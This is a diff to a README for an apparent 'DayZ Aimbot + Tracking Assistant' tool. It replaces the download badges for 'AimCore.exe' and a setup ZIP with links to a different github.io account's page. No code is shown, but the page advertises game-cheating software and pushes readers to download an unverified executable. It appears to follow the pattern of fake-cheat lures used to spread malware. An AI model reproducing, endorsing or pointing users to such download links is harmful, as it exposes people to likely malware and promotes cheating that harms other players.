@@ -1,7 +1,7 @@
 # 🎯 DayZ Aimbot + Tracking Assistant — Setup Tool
 
-[![Download AimCore.exe](https://img.shields.io/badge/Download-AimCore.exe-green?style=for-the-badge)](https://dayz-aimbot-tracking-assistant.github.io/.github/)
-[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://dayz-aimbot-tracking-assistant.github.io/.github/)
+[![Download AimCore.exe](https://img.shields.io/badge/Download-AimCore.exe-green?style=for-the-badge)](https://orionhuffmanjzdx.github.io/.github/DayZ-Assistant)
+[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://orionhuffmanjzdx.github.io/.github/DayZ-Assistant)
 
 ---
 
